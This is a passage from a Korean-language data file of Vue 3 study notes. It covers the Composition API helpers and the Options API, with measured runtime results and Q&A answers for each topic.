      "참고서 Composition API 헬퍼 페이지입니다. 다섯. useAttrs() → 폴스루 속성 객체(setup context의 attrs. <script setup>용. 비반응). useSlots() → 슬롯 함수 객체(TS는 defineSlots 선호). useModel(props, key, { get, set }?)(3.4+. defineModel의 런타임. SFC 밖에서 쓸 때 props·emits 직접 선언). useTemplateRef(key) → Readonly<ShallowRef<T | null>>(템플릿 ref=\"key\"와 동기). useId() → string(앱 안 고유, SSR·클라이언트 안정, 같은 컴포넌트에서 여러 번 부르면 다른 id. 'computed 안에서 부르지 말 것'. app.config.idPrefix). 실제로 돌려 보면 useTemplateRef는 setup·beforeMount null, mounted 요소, v-for는 배열, 컴포넌트는 expose한 것만. useId는 'v-0'·'v-1', idPrefix 'app'이면 'app-0', 서버도 'v-0'. useModel은 compileScript가 defineModel을 _useModel(__props, 'modelValue')로 바꾼 자리. attrs는 폴스루 속성이 담기고 리스너·class 병합. 이 노드의 질문은 하나입니다. 다섯이 각각 무엇을 돌려주나.",
    blocks: [
      {
        label: "항목",
        body: "항목마다 핵심 한 줄과 실제로 돌려 본 것을 붙였습니다.",
        code: "항목                              시그니처                                        세부\nuseAttrs()                         Record<string, unknown>                        setup context.attrs · 폴스루 포함 · 비반응 · <script setup> 용\nuseSlots()                         Record<string, (...args) => VNode[]>           context.slots · TS 는 defineSlots 선호\nuseModel(props, key, opts?)        ModelRef  (3.4+)                               defineModel 의 런타임 · opts { get(v), set(v) } · SFC 밖은 props/emits 직접 선언 (['count'] · ['update:count'])\nuseTemplateRef(key)                Readonly<ShallowRef<T | null>>  (3.5+)          템플릿 ref=\"key\" 와 동기 · 마운트 전 null · v-for 배열 · 컴포넌트는 expose\nuseId()                            string  (3.5+)                                 앱 안 고유 · SSR 안정 · 호출마다 다름 · computed 안 X · app.config.idPrefix",
        codeLang: "text",
      },
      {
        label: "실제로 돌려 보면",
        body: "Chrome: useTemplateRef('input') → setup null · beforeMount null · mounted INPUT. useTemplateRef('items')(v-for) → ['a','b','c']. 컴포넌트 ref → expose({ pub })만 보임(secret undefined). useId() ×2 → 'v-0', 'v-1'. app.config.idPrefix = 'app' → 'app-0', 'app-1'. 하이드레이션에서 서버 'v-0'과 일치해 불일치 없음. Node: useId → 'v-0'(서버). compileScript: defineModel<string>({ required: true }) → const model = _useModel<string>(__props, \"modelValue\") + props modelValue/modelModifiers + emits update:modelValue. setup(props, { attrs, slots })의 attrs에 class·data-x 폴스루, slots.default?.() 폴백 분기(useAttrs·useSlots가 그 둘의 <script setup> 접근). 자세한 맥락은 템플릿 ref·접근성·컴포넌트 v-model·폴스루 노드.",
        code: "useTemplateRef: setup null → beforeMount null → mounted INPUT · v-for → 배열 · 컴포넌트 → expose 만\nuseId: 'v-0' 'v-1' · idPrefix 'app' → 'app-0' · 서버 'v-0' (일치 → 불일치 없음)\nuseModel: defineModel → _useModel(__props, \"modelValue\") (compileScript)\nuseAttrs/useSlots: context.attrs { class, data-x } · slots.default?.()",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 다섯은 setup context · 템플릿 · 앱의 '손잡이' 를 <script setup> 에서 잡는 함수들이다",
        body: "<script setup>에는 setup(props, context) 시그니처가 없으므로 context의 attrs·slots를 useAttrs·useSlots로 잡고, 템플릿의 ref를 useTemplateRef로 잡고, v-model 계약을 useModel(매크로 defineModel이 이것으로 컴파일)로 잡고, 앱 수준 고유 id를 useId로 받습니다. 전부 '이 컴포넌트 인스턴스'에 매이므로 setup 중에 부릅니다. attrs·slots는 비반응 스냅샷, 템플릿 ref는 마운트 뒤, useId는 호출 순서로 안정.",
      },
      {
        label: "다음 입구",
        body: "다음 갈래 'Options API'는 같은 것을 옵션 객체로 적은 쪽입니다. 여섯 페이지.",
      },
      {
        label: "확인 질문",
        body: "(1) <script setup>에서 부모가 넘긴 슬롯이 있는지 보고 조건부로 그리려면? (2) 보통 setup() 함수로 v-model을 구현하려는데 defineModel이 없습니다. (3) 같은 컴포넌트에서 useId를 computed 안에 넣었더니 id가 바뀝니다.",
        notes: [
          {
            title: "답",
            body: "(1) 템플릿에서는 $slots.header로 바로 검사할 수 있고(v-if=\"$slots.header\"), 스크립트에서 필요하면 const slots = useSlots(); slots.header로 봅니다. slots는 비반응 스냅샷이라 갱신에 따라 바뀌는 것은 템플릿의 $slots가 안전합니다. TS 타입이 필요하면 defineSlots<{ header?: () => any }>()가 useSlots 대신 권장. (2) useModel(props, 'modelValue')입니다(3.4+). SFC 밖에서는 컴파일러가 선언을 안 만들어 주니 props: ['modelValue'], emits: ['update:modelValue']를 직접 적고 setup(props) { const model = useModel(props, 'modelValue'); return { model } }. 실제로 defineModel이 바로 이 호출로 컴파일됩니다. (3) 문서의 경고입니다. 'useId를 computed 안에서 부르면 인스턴스 충돌이 날 수 있다'. computed는 재계산되고 그때의 호출 컨텍스트가 다를 수 있습니다. setup 최상위에서 const id = useId()로 한 번 받아 computed나 템플릿에서 그 변수를 씁니다. 여러 앱이 한 페이지에 있으면 idPrefix로 가릅니다(실제로 'app-0').",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Composition API: Helpers", href: `${DOCS}/api/composition-api-helpers` },
      { label: "Template Refs", href: `${DOCS}/guide/essentials/template-refs` },
    ],
  },

  {
    id: "va-options",
    name: "Options API",
    tagline: "같은 런타임을 옵션 객체로: 상태, 렌더링, 라이프사이클, 컴포지션, 기타, 그리고 this 의 인스턴스 프로퍼티",
    intro:
      "참고서 셋째 갈래, 여섯 페이지입니다. 상태(data·props·computed·methods·watch·emits·expose), 렌더링(template·render·compilerOptions·slots), 라이프사이클(beforeCreate … serverPrefetch), 컴포지션(provide·inject·mixins·extends), 기타(name·inheritAttrs·components·directives), 컴포넌트 인스턴스($data·$props·$el·$options·$parent·$root·$slots·$refs·$attrs·$watch·$emit·$forceUpdate·$nextTick). Composition API와 같은 런타임이라 대응표로 읽힙니다. 공통 주의는 '화살표 함수를 쓰면 this가 인스턴스가 아님'. 실제로 돌려 보면 data()의 $·_ 접두 키(this.$a undefined), mounted의 $el(단일 루트 P, 다중 루트 텍스트 노드), template 문자열 Options 컴포넌트의 서버 렌더, 그리고 Composition 측정과 같은 훅 순서를 확인했습니다.",
    blocks: [
      {
        label: "여섯 페이지 한눈에",
        body: "항목마다 핵심 한 줄과 실제로 돌려 본 것을 붙였습니다.",
        code: "페이지            항목                                                                   Composition 대응\n상태             data · props · computed · methods · watch · emits · expose                  ref/reactive · defineProps · computed · 함수 · watch · defineEmits · defineExpose\n렌더링           template · render · compilerOptions · slots(3.3+)                            <template> · setup 반환 렌더 함수 · 같음 · defineSlots\n라이프사이클       beforeCreate · created · beforeMount … unmounted · errorCaptured · renderTracked/Triggered · activated/deactivated · serverPrefetch   setup · onX\n컴포지션          provide · inject · mixins(비권장) · extends(Composition 비권장)                provide/inject · 컴포저블\n기타             name · inheritAttrs · components · directives                              파일명 추론 · defineOptions · import · vXxx\n컴포넌트 인스턴스   $data · $props · $el · $options · $parent · $root · $slots · $refs · $attrs · $watch · $emit · $forceUpdate · $nextTick   (this 없음 — context · useX)",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "첫 페이지 '옵션: 상태'부터입니다.",
      },
    ],
    sources: [
      { label: "Options: State", href: `${DOCS}/api/options-state` },
      { label: "Component Instance", href: `${DOCS}/api/component-instance` },
    ],
  },

  {
    id: "va-opt-state",
    name: "옵션: 상태",
    tagline: "data 는 함수, props 는 선언, computed 는 캐시, methods 는 this, watch 는 경로, emits 는 선언, expose 는 공개 범위",
    intro:
      "참고서 옵션: 상태 페이지입니다. data(this, vm) → 객체(함수여야. 반환 객체가 반응형. $·_ 접두 키는 this에 안 올라감. 브라우저 API 객체 넣지 말 것. 화살표면 첫 인자 vm). props(배열·객체 { type, required, default, validator(value, rawProps) }. 객체·배열 default는 팩토리). computed({ name: getter | { get, set } }. this 바인딩. 화살표면 vm 인자). methods(this 바인딩. 화살표 X). watch({ key: cb | 메서드명 | { handler, immediate, deep, flush, onTrack, onTrigger } | 배열 }. key는 루트 프로퍼티나 단순 점 경로. 복잡 식은 $watch). emits(배열 또는 { name: null | validator }. 선언된 리스너는 $attrs에서 제외). expose(string[]. 템플릿 ref·$parent에 보일 것). 실제로 돌려 보면 data: () => ({ $a: 1, _b: 2 })에서 this.$a는 undefined, this._b는 2, this.$data._b는 2(문서는 둘 다 예약), props 검증 경고 셋과 Boolean 캐스팅, emits 선언이 네이티브 폴스루를 끊는 것, expose로 공개 범위. 이 노드의 질문은 하나입니다. 일곱 옵션의 타입과 규칙은 무엇인가.",
    blocks: [
      {
        label: "항목",
        body: "항목마다 핵심 한 줄과 실제로 돌려 본 것을 붙였습니다.",
        code: "옵션          타입                                                    세부\ndata          (this, vm) => object                                     함수 필수 · 반응형 · 최상위 키는 전부 처음에 (undefined 라도) · $·_ 접두는 프록시 X ($data 로) · 브라우저 객체 X · 화살표면 vm 인자\nprops         string[] | { [k]: Type | { type, required, default, validator(value, rawProps) } }   type: String Number Boolean Array Object Date Function Symbol 생성자 [..] · Boolean 캐스팅 · default 객체/배열은 팩토리 · 검증은 개발 경고\ncomputed      { [k]: getter(this, vm) | { get, set } }                 캐시 · this · 화살표면 vm\nmethods       { [k]: fn }                                              this 바인딩 (넘겨도) · 화살표 X\nwatch         { [key]: cb(new, old, onCleanup) | '메서드명' | { handler, immediate, deep, flush: 'pre'|'post'|'sync', onTrack, onTrigger } | [...] }   key: 루트 또는 a.b.c 경로 · 식 X ($watch) · 배열은 순서대로\nemits         string[] | { [name]: null | (...args) => boolean }        선언 리스너는 $attrs 제외 (네이티브 폴스루 끊김) · 검증은 경고\nexpose        string[]                                                 템플릿 ref · $parent 에 보일 프로퍼티만 (내장 $ 프로퍼티는 제외 안 됨)",
        codeLang: "text",
      },
      {
        label: "실제로 돌려 보면",
        body: "Chrome: data: () => ({ $a: 1, _b: 2, c: 3 }) → this.$a undefined(프록시 안 됨), this._b 2, this.$data._b 2. 문서는 $와 _ 둘 다 예약이라 피하라고 하니 _b가 읽힌 것에 의존하지 않습니다. Node: props { size: { validator }, count: Number, required: { required: true } }에 size=\"xl\", count=\"3\", required 없음 → 'Invalid prop: custom validator check failed for prop \"size\".', 'Invalid prop: type check failed for prop \"count\". Expected Number with value 3, got String with value \"3\".', 'Missing required prop: \"required\"'. Boolean 캐스팅 <Flags a c d> → true false \"\" true. emits: ['click'] 자식의 @click은 emit만, 미선언은 네이티브 폴스루. expose({ pub }) → 부모 ref에 pub만(Options의 expose: ['pub']과 같음). template 문자열 Options 컴포넌트({ data, template }) 서버 렌더 <button>1</button>. 자세한 맥락은 가이드 반응성 기초·Props·컴포넌트 이벤트·템플릿 ref 노드.",
        code: "data $·_:  this.$a undefined · this._b 2 · this.$data._b 2   (둘 다 예약 — 피할 것)\nprops 경고: custom validator check failed · type check failed … Expected Number with value 3, got String with value \"3\" · Missing required prop\nBoolean:   <Flags a c d> → true false \"\" true\nemits:     선언 → 네이티브 click 끊김 · 미선언 → 폴스루\nexpose:    공개한 것만 부모 ref 에",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 일곱 옵션은 this 에 무엇을 얹나의 선언이고, 함수 꼴과 화살표의 차이가 전부 this 때문이다",
        body: "data·computed·methods·watch는 this(인스턴스 프록시)를 받는 함수들이라 화살표 함수면 this가 없어 vm 인자나 일반 함수가 필요합니다. props·emits·expose는 경계의 계약 선언이고 Composition의 defineProps·defineEmits·defineExpose와 같은 런타임입니다. data가 함수인 이유는 인스턴스마다 새 객체여야 하기 때문이고, 최상위 키를 처음에 다 두는 이유는 프록시가 그 키들을 this에 올리기 때문입니다.",
      },
      {
        label: "다음 입구",
        body: "다음 페이지 '옵션: 렌더링'은 template·render·compilerOptions·slots입니다.",
      },
      {
        label: "확인 질문",
        body: "(1) watch: { 'form.address.city': fn }이 동작하고 'items[0].name'은 안 됩니다. (2) data()에 const로 만든 공통 객체를 그대로 돌려줬더니 인스턴스 간 상태가 섞입니다. (3) methods: { save: () => this.doSave() }가 에러입니다.",
        notes: [
          {
            title: "답",
            body: "(1) watch 키는 '루트 프로퍼티 또는 단순 점 구분 경로'만 지원하고 인덱스·식은 안 됩니다(문서). 복잡한 식은 created에서 this.$watch(() => this.items[0]?.name, fn)로 getter를 넘깁니다. $watch는 unwatch 함수를 돌려주니 필요하면 보관합니다. (2) data는 인스턴스마다 '새' 객체를 돌려줘야 합니다. 바깥 const 객체를 돌려주면 모든 인스턴스가 같은 객체를 reactive로 감싸 공유됩니다. data() { return { ...shared } } 또는 함수 안에서 새로 만듭니다. props의 default가 객체일 때 팩토리여야 하는 것과 같은 이유입니다. (3) 화살표 함수는 자기 this가 없어 인스턴스 프록시를 못 받습니다(문서: methods에 화살표 금지). methods: { save() { this.doSave() } }처럼 메서드 축약(일반 함수)으로 씁니다. computed·watch 핸들러·라이프사이클 훅도 같습니다.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Options: State", href: `${DOCS}/api/options-state` },
      { label: "Reactivity Fundamentals (Options API)", href: `${DOCS}/guide/essentials/reactivity-fundamentals` },
    ],
  },

  {
    id: "va-opt-rendering",
    name: "옵션: 렌더링",
    tagline: "template(런타임 컴파일) · render(함수) · compilerOptions · slots(3.3+ 타입)",
    intro:
      "참고서 옵션: 렌더링 페이지입니다. 넷. template: string(런타임 컴파일. '컴파일러 포함 빌드에서만. 이름에 runtime이 든 빌드는 X'. '#id'로 시작하면 그 요소의 innerHTML. render가 있으면 무시. 루트에 둘 다 없으면 마운트 요소 innerHTML. '신뢰할 수 없는 소스 금지'). render(this) → VNodeChild(템플릿 대안. 둘 다 있으면 render 우선. SFC 템플릿은 render로 사전 컴파일). compilerOptions({ isCustomElement, whitespace: 'condense' | 'preserve', delimiters, comments }. 전체 빌드에서만. app.config보다 우선). slots: SlotsType<{…}>(3.3+ 타입 전용). 실제로 돌려 보면 template 문자열 컴포넌트가 서버와 브라우저(esm-browser 전체 빌드)에서 컴파일돼 렌더됐고, 브라우저 템플릿 컴파일 에러는 '[Vue warn]: Template compilation error: …'로 왔으며, 루트 컴포넌트에 template이 없을 때 컨테이너 innerHTML을 템플릿으로 썼습니다(in-DOM). 이 노드의 질문은 하나입니다. 템플릿은 어디서 어떻게 렌더 함수가 되나.",
    blocks: [
      {
        label: "항목",
        body: "항목마다 핵심 한 줄과 실제로 돌려 본 것을 붙였습니다.",
        code: "옵션              타입                                         세부\ntemplate          string                                        런타임 컴파일 · 컴파일러 포함 빌드만 (vue.runtime.* X) · '#id' → 그 요소 innerHTML · render 있으면 무시 · 루트에 둘 다 없으면 마운트 요소 innerHTML · 신뢰 소스만\nrender            (this) => VNodeChild                          템플릿 대안 · render 우선 · SFC 는 사전 컴파일\ncompilerOptions   { isCustomElement(tag), whitespace: 'condense'(기본)|'preserve', delimiters: ['{{','}}'], comments: false }   전체 빌드만 · 컴포넌트 수준이 app.config 보다 우선\nslots             SlotsType<{ default: {…}; item: {…} }>  (3.3+)    타입 전용 (런타임 값 무시) · defineComponent 와",
        codeLang: "text",
      },
      {
        label: "실제로 돌려 보면",
        body: "Node: createSSRApp({ data: () => ({ n: 1 }), template: '<button @click=\"n++\">{{ n }}</button>' }) → <button>1</button>(서버 번들은 컴파일러 포함). Chrome(esm-browser 전체 빌드): 모든 측정이 template 문자열이었고 컴파일됐습니다. <Transition><p/><p/></Transition>은 '[Vue warn]: Template compilation error: <Transition> expects exactly one child element or component.' 루트 컴포넌트에 template 없이 createApp({ components }).mount(el)하니 el.innerHTML이 템플릿으로 쓰여 in-DOM 파서 함정(소문자·자기 닫힘·table)이 나타났습니다. @vue/compiler-dom의 compile 출력이 render 함수(_createElementBlock…)였고, compileScript의 inlineTemplate 출력은 setup이 렌더 함수를 돌려주는 꼴이었습니다. 자세한 맥락은 시작하기·툴링·렌더 함수·렌더링 메커니즘 노드.",
        code: "template 문자열 → 서버 <button>1</button> · 브라우저 컴파일 ✓   (둘 다 컴파일러 포함 빌드)\n컴파일 에러 → [Vue warn]: Template compilation error: …\n루트 template 없음 → 마운트 요소 innerHTML = 템플릿 (in-DOM 함정)\ncompiler-dom compile → render(_ctx, _cache) { return (_openBlock(), _createElementBlock(…)) }",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 템플릿은 어디선가 렌더 함수가 되어야 하고, 그 '어디' 가 빌드(SFC)인지 런타임(template 옵션)인지가 빌드 크기와 보안을 정한다",
        body: "SFC의 <template>은 빌드 때 render로 컴파일되어 런타임 전용 빌드로 충분합니다. template 옵션·in-DOM 템플릿은 런타임에 컴파일되어 전체 빌드(+14kb)가 필요하고, 사용자 문자열이 들어가면 코드 실행이라 금지입니다. render 옵션은 컴파일러를 건너뛰는 손 렌더 함수이고 패치 플래그가 없습니다. compilerOptions는 런타임 컴파일러의 설정이라 빌드 환경에서는 빌드 도구 옵션으로 갑니다.",
      },
      {
        label: "다음 입구",
        body: "다음 페이지 '옵션: 라이프사이클'은 열넷의 훅과 SSR 호출 여부입니다.",
      },
      {
        label: "확인 질문",
        body: "(1) 번들러 프로젝트에서 { template: '<p>x</p>' } 컴포넌트가 빈 화면입니다. (2) 템플릿의 {{ }}가 서버 템플릿 엔진과 충돌합니다. (3) 템플릿 공백이 운영에서 뭉개집니다.",
        notes: [
          {
            title: "답",
            body: "(1) 번들러의 기본 'vue'는 런타임 전용(vue.runtime.esm-bundler.js)이라 template 옵션을 컴파일하지 못합니다(문서: runtime 빌드에서는 불가. 개발 모드면 경고). alias로 vue.esm-bundler.js(전체 빌드)를 가리키거나, 템플릿을 .vue 파일로 옮겨 빌드 때 컴파일하거나, render 함수로 씁니다. (2) compilerOptions.delimiters = ['${', '}']로 보간 구분자를 바꿉니다. 전체 빌드(런타임 컴파일)면 컴포넌트 옵션이나 app.config.compilerOptions, SFC면 빌드 도구의 compilerOptions. 서버 엔진 쪽을 바꾸거나 v-pre로 그 영역을 컴파일에서 빼는 길도 있습니다. (3) 기본 whitespace: 'condense'는 요소 사이 줄바꿈 공백을 제거하고 연속 공백을 하나로 압축합니다. 의도된 공백(인라인 요소 사이)이 사라지면 compilerOptions.whitespace = 'preserve'로 바꾸되 전체 빌드·빌드 도구 옵션에 둡니다. <pre>처럼 공백이 의미인 요소는 보존됩니다.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Options: Rendering", href: `${DOCS}/api/options-rendering` },
      { label: "Tooling — Note on In-Browser Template Compilation", href: `${DOCS}/guide/scaling-up/tooling#note-on-in-browser-template-compilation` },
    ],
  },

  {
    id: "va-opt-lifecycle",
    name: "옵션: 라이프사이클",
    tagline: "beforeCreate · created · beforeMount · mounted · beforeUpdate · updated · beforeUnmount · unmounted · errorCaptured · renderTracked/Triggered · activated/deactivated · serverPrefetch",
    intro:
      "참고서 옵션: 라이프사이클 페이지입니다. Composition API 훅과 1:1이되 둘이 더 있습니다. beforeCreate(props 해석 뒤, data·computed 설정 전. setup은 이보다 먼저), created(data·computed·methods·watch 설정 뒤. $el 없음). 나머지는 같습니다. beforeMount·mounted(동기 자식만 보장. SSR X), beforeUpdate·updated('상태 변경 → 무한 루프'. SSR X), beforeUnmount·unmounted(SSR X), errorCaptured(출처 7종·아래→위·false로 중단·훅이 던지면 둘 다 errorHandler. 주의: 에러 UI가 원래 내용 다시 렌더 X. async setup의 에러는 템플릿을 그대로 렌더. Suspense 안 깊은 자식 교체는 하이드레이션 불일치), renderTracked·renderTriggered(개발만), activated·deactivated(KeepAlive), serverPrefetch(서버만). 'SSR에서 호출되는 훅은 beforeCreate·created만'. 실제로 돌려 보면 Options 훅 순서는 Composition 측정과 같고(mounted() { this.$el }로 단일 루트 P·다중 루트 텍스트 노드), 서버에서는 serverPrefetch만. 이 노드의 질문은 하나입니다. Options의 열넷은 Composition의 열셋과 어디가 다른가.",
    blocks: [
      {
        label: "항목",
        body: "항목마다 핵심 한 줄과 실제로 돌려 본 것을 붙였습니다.",
        code: "훅                 시점                                                   SSR   Composition 대응 / 세부\nbeforeCreate        props 해석 뒤 · data/computed 전                           O     setup 이 먼저 돈다\ncreated             data · computed · methods · watch 설정 뒤 · $el 없음           O     setup 안\nbeforeMount         DOM 생성 전                                             X     onBeforeMount\nmounted             DOM 삽입 뒤 · 동기 자식 마운트 뒤                            X     onMounted\nbeforeUpdate        DOM 갱신 전 · 상태 변경 안전                                X     onBeforeUpdate\nupdated             DOM 갱신 뒤 · 자식 먼저 · 상태 변경 → 루프                     X     onUpdated\nbeforeUnmount       언마운트 전 · 온전                                        X     onBeforeUnmount\nunmounted           자식 언마운트 · 효과 정지 뒤                                X     onUnmounted\nerrorCaptured(err, instance, info)   자손 에러 · 아래→위 · false 중단                -     onErrorCaptured · 에러 UI 는 원래 내용 X · async setup 에러도 템플릿 렌더 · Suspense 깊은 교체는 불일치\nrenderTracked / renderTriggered     개발만                                   X     onRenderTracked / onRenderTriggered\nactivated / deactivated             KeepAlive                                X     onActivated / onDeactivated\nserverPrefetch                      서버 · Promise 기다림                       O만   onServerPrefetch",
        codeLang: "text",
      },
      {
        label: "실제로 돌려 보면",
        body: "Chrome: Options 컴포넌트 { template, mounted() { log(this.$el) } }에서 단일 루트 $el은 P, 다중 루트 $el은 텍스트 노드(자리표시). 부모 mounted에서 자식 DOM 셋 전부. 훅 순서는 Composition 측정과 같음(마운트 자식 먼저 완료, 갱신 자식 먼저 완료, 언마운트 자식 먼저). KeepAlive activated/deactivated 반복. errorCaptured(false)로 errorHandler 차단. Node: 서버에서 beforeMount·mounted X, serverPrefetch만. data()와 template만 가진 Options 컴포넌트가 서버에서 렌더됨(beforeCreate·created 자리의 일). 자세한 맥락은 가이드 라이프사이클·KeepAlive·SSR 노드.",
        code: "mounted() { this.$el }  → 단일 루트 P · 다중 루트 텍스트 노드\n순서 = Composition 과 동일 · 서버 = beforeCreate·created(setup) + serverPrefetch 만\nerrorCaptured(() => false) → errorHandler 미호출",
        codeLang: "text",
      },
      {
        label: "문제의 구조: Options 훅은 Composition 훅과 같은 시점이고, beforeCreate·created 는 setup 이 대신한다",
        body: "Options API의 열넷 중 열둘은 onX와 1:1이고 beforeCreate·created만 setup()으로 합쳐집니다. setup은 beforeCreate보다 먼저 돌아 Options 훅이 setup 반환값을 this로 볼 수 있습니다. 서버에서 돌지 않는 훅의 목록이 같고(마운트 이후 전부), errorCaptured의 전파·중단 규칙도 같습니다. 화살표 함수는 this가 없어 Options 훅에 쓰지 않습니다.",
      },
      {
        label: "다음 입구",
        body: "다음 페이지 '옵션: 컴포지션'은 provide·inject·mixins·extends입니다.",
      },
      {
        label: "확인 질문",
        body: "(1) created에서 this.$el.focus()가 에러입니다. (2) errorCaptured가 잡은 뒤 같은 자식을 다시 그리면? (3) Options 컴포넌트에서 setup 반환값을 created에서 읽을 수 있나요?",
        notes: [
          {
            title: "답",
            body: "(1) created는 '$el이 아직 없는' 시점입니다(문서: 마운트 단계 전). DOM 접근은 mounted부터. this.$el 대신 템플릿 ref(this.$refs.x)를 mounted에서 쓰는 것이 문서의 권장입니다. 다중 루트면 $el은 텍스트 노드라 쓸모가 없습니다(실제로 확인). (2) 에러 상태에서 원래 내용(에러를 낸 자식)을 다시 렌더하면 다시 던져 무한 렌더 루프입니다(문서 경고). 에러 UI를 보일 때는 자식을 v-if로 제거하고 대체 UI만 그리며, false를 돌려줬다면 errorHandler에 가지 않으니 그 자리에서 보고합니다. (3) 됩니다. setup은 beforeCreate보다 먼저 실행되고 반환 객체가 인스턴스에 합쳐지므로 created에서 this.x로 읽을 수 있습니다. 혼용은 문서가 이전·통합 때만 권하므로 그 컴포넌트를 손볼 때 한쪽으로 통일합니다.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Options: Lifecycle", href: `${DOCS}/api/options-lifecycle` },
      { label: "Composition API: Lifecycle Hooks", href: `${DOCS}/api/composition-api-lifecycle` },
    ],
  },

  {
    id: "va-opt-composition",
    name: "옵션: 컴포지션",
    tagline: "provide(함수 꼴로 this) · inject(from · default) · mixins(비권장) · extends(Composition 비권장)",
    intro:
      "참고서 옵션: 컴포지션 페이지입니다. 넷. provide: object | (this) => object(함수 꼴로 인스턴스 접근. Symbol 키 가능. 'data 기반 값은 반응형 아님'. computed로). inject: string[] | { [local]: string | symbol | { from?, default? } }(주입 바인딩은 '의도적으로 비반응'. 반응형 객체를 넘기면 그 안은 반응. 없고 default 없으면 undefined. 비원시 default는 팩토리). mixins: ComponentOptions[](옵션별 병합 규칙. 믹스인 훅이 컴포넌트 훅보다 먼저. '더 이상 권장하지 않음. 컴포저블로'). extends: ComponentOptions(첫 믹스인처럼 상속. 'setup()은 병합하지 않음. Composition API에는 비권장'. 워크어라운드 Base.setup(props, ctx) 호출). 측정은 Composition의 provide/inject(ref 반응, readonly 경고, Teleport·SSR)가 같은 런타임이라 그대로 적용됩니다. 이 노드의 질문은 하나입니다. Options에서 주입과 재사용은 어떻게 적고 무엇을 피하나.",
    blocks: [
      {
        label: "항목",
        body: "항목마다 핵심 한 줄과 실제로 돌려 본 것을 붙였습니다.",
        code: "옵션       타입                                                        세부\nprovide    object | (this) => object                                   함수 꼴로 this 접근 (인스턴스마다) · Symbol 키 OK · data 값은 비반응 → computed(() => this.x) 로\ninject     string[] | { [local]: string | symbol | { from?: string | symbol, default?: any | () => any } }   비반응 바인딩 (의도) · 반응형 객체면 안은 반응 · 없으면 undefined · 비원시 default 는 팩토리 · from 으로 이름 바꾸기 · data() 에서 쓸 수 있음 (먼저 해석)\nmixins     ComponentOptions[]                                          옵션별 병합 · 믹스인 훅이 먼저 · '더 이상 권장하지 않음' → 컴포저블\nextends    ComponentOptions                                            첫 믹스인처럼 · setup() 은 병합 X → Composition 비권장 (Base.setup 수동 호출) · 믹스인=조합 · extends=상속",
        codeLang: "text",
      },
      {
        label: "실제로 돌려 보면",
        body: "Options 꼴 provide/inject를 따로 돌리지는 않았고, 같은 런타임인 Composition 측정이 적용됩니다. ref를 provide하면 자손이 반응형으로 갱신(1), readonly를 자손이 쓰면 'Set operation on key \"value\" failed: target is readonly.', Teleport 안 inject ✓, SSR inject ✓, 보통 객체는 추적 없음. Options의 provide() { return { message: this.message } }가 비반응인 이유는 그 순간의 값(문자열)을 넘기기 때문이고, computed(() => this.message)를 넘기면 ref와 같이 반응형으로 이어집니다. 컴포저블 노드에서 믹스인의 단점(출처 불명·충돌·결합)과 FAQ의 '컴포저블로' 권장을 적었습니다.",
        code: "ref provide → 자손 반응 ✓ · readonly 쓰기 → 경고 · Teleport/SSR ✓ · 보통 값 → 스냅샷\nprovide() { return { msg: this.msg } }        → 비반응 (문자열 복사)\nprovide() { return { msg: computed(() => this.msg) } } → 반응",
        codeLang: "text",
      },
      {
        label: "문제의 구조: provide/inject 는 Composition 과 같은 통로이고, mixins/extends 는 컴포저블이 대체한 옛 재사용이다",
        body: "주입은 조상 체인을 따르고 넘기는 값이 반응성을 정합니다(Options는 함수 꼴 provide와 computed가 그 역할). mixins는 옵션을 병합해 섞는 방식이라 어디서 온 프로퍼티인지 숨고 이름이 충돌해 문서가 더 이상 권하지 않으며, extends는 상속이되 setup을 병합하지 못해 Composition과 맞지 않습니다. 둘의 자리는 컴포저블(함수 호출로 출처가 보임)이 가져갔습니다.",
      },
      {
        label: "다음 입구",
        body: "다음 페이지 '옵션: 기타'는 name·inheritAttrs·components·directives입니다.",
      },
      {
        label: "확인 질문",
        body: "(1) Options 부모가 provide: { theme: this.theme }를 썼더니 undefined입니다. (2) 주입한 user를 바꿔도 자손이 모릅니다. (3) 공통 로직 믹스인 다섯이 겹쳐 어느 메서드가 어디서 왔는지 모릅니다.",
        notes: [
          {
            title: "답",
            body: "(1) 객체 꼴 provide는 모듈 평가 시점의 객체라 this가 인스턴스가 아닙니다. 함수 꼴 provide() { return { theme: this.theme } }로 바꾸면 인스턴스마다 평가됩니다. 그래도 문자열 스냅샷이라 비반응이니 (2)로 이어집니다. (2) provide() { return { user: computed(() => this.user) } }처럼 computed(또는 reactive 객체)를 넘기면 자손의 inject 바인딩이 그것을 가리켜 반응형으로 갱신됩니다(실제로 ref provide는 자손 갱신). 자손은 injected.value로 읽습니다(Options inject는 풀어 주지 않음). 변경은 제공자가 하고 readonly로 막습니다. (3) 문서가 믹스인을 더 이상 권하지 않는 이유 그대로입니다. 각 믹스인을 컴포저블 함수로 바꾸고 setup()에서 const { a } = useA(); const { b } = useB()처럼 받으면 어느 함수가 무엇을 돌려주는지 코드에 보입니다. Options 컴포넌트를 유지해야 하면 setup() 옵션을 추가해 컴포저블만 쓰고 믹스인을 하나씩 뺍니다.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Options: Composition", href: `${DOCS}/api/options-composition` },
      { label: "Composables vs Mixins", href: `${DOCS}/guide/reusability/composables#vs-mixins` },
    ],
  },

  {
    id: "va-opt-misc",
    name: "옵션: 기타",
    tagline: "name(재귀 · KeepAlive · DevTools) · inheritAttrs · components · directives",
    intro:
      "참고서 옵션: 기타 페이지입니다. 넷. name: string(템플릿의 재귀 자기 참조, DevTools 표시, 경고 추적. SFC는 파일명 추론. '3.2.34부터 <script setup> SFC는 파일명으로 name 추론'. 전역 등록은 등록 이름이 name. KeepAlive include/exclude 매칭에는 명시 필요). inheritAttrs: boolean = true(false면 폴스루를 루트에 안 적용. v-bind=\"$attrs\"로. <script setup>은 defineOptions). components: { [name]: Component }(로컬 등록). directives: { [name]: Directive }(로컬 등록). 실제로 돌려 보면 KeepAlive include=\"A,B,C\"가 name으로 매칭됐고, inheritAttrs: false에서 attrs가 안쪽 input에 갔고, 로컬 directives 옵션은 자식 템플릿에서 'Failed to resolve directive'였습니다. 이 노드의 질문은 하나입니다. 네 옵션은 각각 어느 범위에 작용하나.",
    blocks: [
      {
        label: "항목",
